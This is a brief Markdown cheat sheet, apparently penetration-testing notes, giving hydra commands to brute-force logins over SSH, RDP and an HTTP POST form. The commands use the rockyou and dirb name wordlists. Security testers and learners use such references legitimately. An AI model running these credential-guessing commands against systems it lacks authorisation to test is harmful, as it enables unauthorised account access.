## SSH
### hydra
- Known username
```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```
- Known password
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<PASSWORD>" ssh://<IP>
```
## RDP
### hydra
- Known username 
```
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt rdp://<IP>
```
- Known password
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<PASSWORD>" rdp://<IP>
```
## HTTP-Form
### hydra
- http-post-form
```
hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
